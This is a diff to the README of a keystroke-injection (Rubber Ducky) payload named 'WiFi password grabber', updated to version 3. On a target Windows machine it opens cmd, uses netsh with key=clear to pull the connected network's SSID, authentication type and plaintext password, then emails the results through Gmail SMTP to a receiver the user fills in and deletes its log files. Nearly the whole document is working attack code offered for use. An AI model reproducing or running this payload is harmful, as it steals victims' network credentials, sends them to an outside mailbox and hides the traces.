@@ -1,22 +1,17 @@
-# This payload:
-1. Opens CMD
-2. Finds the key (password) of the WiFi the target is connected to
-3. Saves the SSID, Network type, Authentication and the key to Log.txt
-4. And emails Log.txt via gmail
-
 ### Change the following things;
 * **ACCOUNT**: Your **gmail account**
 * **PASSWORD**: Your **gmail password**
 * **RECEIVER**: The email you want to send Log.txt to
 
-If you have **any suggestions** please **tell me**.
-
-## **Code**:
+## **Code**;
 ```
+REM Title: WiFi password grabber
 REM Author: Siem
-REM Version: 2.1
-REM Description: Clear text WiFi key grabber
-DELAY 2500
+REM Version: 3
+REM Description: Saves the SSID, Network type, Authentication and the password to Log.txt and emails the contents of Log.txt from a gmail account.
+DELAY 3000
+
+REM --> Minimize all windows
 WINDOWS d
 
 REM --> Open cmd
@@ -27,27 +22,27 @@ ENTER
 DELAY 1000
 
 REM --> Getting SSID
-STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "B"') do set A=%A
+STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
 ENTER
 
-REM --> Creating Temp.txt
-STRING netsh wlan show profiles %A% | findstr "Network type" | findstr /v "broadcast" | findstr /v "Radio">>Temp.txt & netsh wlan show profiles %A% | findstr "Authentication">>Temp.txt & netsh wlan show profiles %A% key=clear | findstr "Key Content">>Temp.txt
+REM --> Creating A.txt
+STRING netsh wlan show profiles %A% key=clear | findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>A.txt
 ENTER
 
 REM --> Get network type
-STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" Temp.txt') do set B=%A
+STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" A.txt') do set B=%A
 ENTER
 
 REM --> Get authentication
-STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" Temp.txt') do set C=%A
+STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" A.txt') do set C=%A
 ENTER
 
 REM --> Get key
-STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" Temp.txt') do set D=%A
+STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" A.txt') do set D=%A
 ENTER
 
-REM --> Delete Temp.txt
-STRING del Temp.txt
+REM --> Delete A.txt
+STRING del A.txt
 ENTER
 
 REM --> Create Log.txt
@@ -63,7 +58,7 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD');
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD')
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
@@ -71,11 +66,9 @@ STRING $ReportEmail.From = 'ACCOUNT@gmail.com'
 ENTER
 STRING $ReportEmail.To.Add('RECEIVER@gmail.com')
 ENTER
-STRING $ReportEmail.Subject = 'WiFi'
+STRING $ReportEmail.Subject = 'WiFi key grabber'
 ENTER
-STRING $ReportEmail.Body = 'The log is attached!'
-ENTER
-STRING $ReportEmail.Attachments.Add('Log.txt')
+STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
 ENTER
 STRING $SMTPInfo.Send($ReportEmail)
 ENTER
@@ -86,3 +79,11 @@ REM --> Delete Log.txt and exit
 STRING del Log.txt & exit
 ENTER
 ```
+
+### Change log;
+1. Original
+2. Bug fixes and narrowed commands
+3. Send contents of Log.txt instead the file itself
+
+### Suggestions;
+**If you have any suggestions, write them down here.**
